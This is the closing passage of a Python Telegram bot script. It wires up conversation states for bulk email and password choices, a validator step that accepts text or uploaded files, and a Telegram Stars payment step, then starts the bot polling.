            AWAIT_BULK_NEW_EMAIL: [CallbackQueryHandler(bulk_email_choice)],
            AWAIT_BULK_NEW_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, bulk_pass_choice), CallbackQueryHandler(bulk_pass_choice)],
            AWAIT_VALIDATOR_DATA: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_validator_data), MessageHandler(filters.Document.MimeType("text/plain"), process_validator_data)],
            AWAIT_PAYMENT: [
                PreCheckoutQueryHandler(precheckout_callback),
                MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment_callback)
            ]
        },
        fallbacks=[CommandHandler("start", start), CommandHandler("cancel", cancel), CallbackQueryHandler(menu_callback)],
        per_message=False,
    )
    app.add_handler(conv)
    logger.info("Glitchyn FAST AIOHTTP Bot Online (Multi-Language + Dynamic Buttons + Stars Payment)")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
